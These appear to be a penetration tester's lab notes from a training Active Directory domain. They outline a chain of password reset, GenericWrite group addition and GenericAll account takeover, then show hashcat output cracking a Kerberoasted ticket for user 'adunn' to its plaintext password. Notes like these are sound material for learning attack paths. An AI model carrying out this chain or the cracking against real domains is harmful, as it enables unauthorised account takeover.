1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

![](Attachments/Pasted%20image%2020260806133038.png)

```
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$25c857e671a48d774e00164dcc45e2dc$6bb00a9bc7d041d5e4d7ef146cbba63c99762e457682fc1f45bcccc3892703e0d8cc6b7c21f2f5c787d3f88c95480088894d2f74d7bc7eb7a2acbe6ce17d5d13c6b416b814ae149fa00b8dd5f235aa25d9b527e47b3ae2d0492a3724faaaf6f1b47f0ae0b73fdef6aba8b980112da42d54ef047c2bc34f09a07e91645b37af14fe6415358887d4435063bdc23fa580d1f1fd1348bac6ca49bc57489dd077ae0d1968ffef7c7fa6c0cc55e55b06e2864e801ebdd4dfaf996c53c2876c5f094dfa71d59c62f16bea831035dccf85598405d46045d092bcd78bd3941d5231ab678e06e854664e6540ef71876fe9b4563c02f92b92a3bde577fe6e012b7264baacd93c2d3fbde086f16a7bdbd0b9eb522c980097a497b84c62bb3fcb9da53c513e11c93044d1ae2d41dffc5e384f0c72e036b46956e71a2aa77eeb4fef28671895dd789f96d738e7b220e56c6cdb6dd9b46bf48610ee4bab0dc05be1df0eb234d170568ac5925abaf5f69e4248a5e0de679f5eff7cf5edd77968b7db4360d3fb6253b57045869945b327cbd18e95ada11a72fc57aa3047dd044898412e737dc30aa3284a2db07a02114d6f1abd0c5e66f1034785bf2c84a4d5b78c94b7ebca888e481062a4460fc0b6075bff86760d945df66bc84064b13476ccb0029722b9da74ae38d8e84861477bb43b702b2fb614dffa10fd64d0662c8e4c539a3b89ea4ca7f540321ef93f4c86b36073302b81dd4b9f8bfd7ebe070b4c6b8acd2f2422b295c9b206679a11307388edfea06fb3cc7ef514e049f2f441f3682fcf78cafad9312200cbb7856694ada28bdd897f66e4f1a2060cfaea9ab461f020727da140d65525c68ee3ea45cde4b1c854f1445bbfb350886046d83d4b4752836609fabe6bcebd5de37bd18a2a8acde7ee106377bf154b3ad34303df13f1fa10f4c92ba74243c1636e7a82aa8628187d8e3fdb379c8d1bae5c27a760fe48520a4e98df6e9f4b6156f7e1a9feda59f410a4b4415b5eec3da1ee3617f82d301f5709b5e54cfd6a5f24da7f8125f2854556f0633e6a50aa71d909fd6379af68427864a95b3c6a40202a3cbab5e35a751ca9644dfd8588f865218b71d3ec45078f9e5d96a463604fba5bddc5142cb06a909e40fafd5553131e6f5d0e17d4b056d059b57399f9217976b906e9a52f7196342127068a34585a626f88034255d3b39a5895fb1c7ed2e055e59fe5cfd768a9aafc6123a499d994b3c2c11f854eb908cd752f721a160f1914ad1fd0248359a73d085ad5d3995ca12bcba135f51a0a3941f2b3d0cdb79603e821a0dc09a7a168f0fa33c24ec2e7611dfc14b72a2a978abfab573aba2efc883ca304db37a35993031faf7e2400e6b0df315511e42be271e346475cccaf17a89c5168d7da5636bf6dbab809cf004f412dd9afb9cc0d90654e1cf38f1a81a1bffb6de0bfa22da5ad1c51a3c4a6b43b14ce61f3cfb52009a68cb0702d1b50c37b18da7e92c3127ccd1cfde1898446217de79b41b0cc801693dfbb5e143476daffc97b61b08910a2480e703292fda27b613672f76391a0a8ead74fe3b777ec58f788014f8bf34502aeb00d90beb5b6ddc453f7da34e5c3aa25bc8f80543dc1c4efbaa751ed7b9a33482d6ea0faedce99cacbdb7df3ea75927f43cf184003c99313a8574a28c3113686738c47ed935cb200:SyncMaster757
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/L...5cb200
Time.Started.....: Thu Aug  6 13:29:53 2026 (18 secs)
Time.Estimated...: Thu Aug  6 13:30:11 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   694.6 kH/s (3.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10584064/14344384 (73.79%)
Rejected.........: 0/10584064 (0.00%)
Restore.Point....: 10579968/14344384 (73.76%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: T0BUSY4U -> Sumon000
Hardware.Mon.#01.: Util: 54%

Started: Thu Aug  6 13:29:47 2026
Stopped: Thu Aug  6 13:30:13 2026
                                                            
```

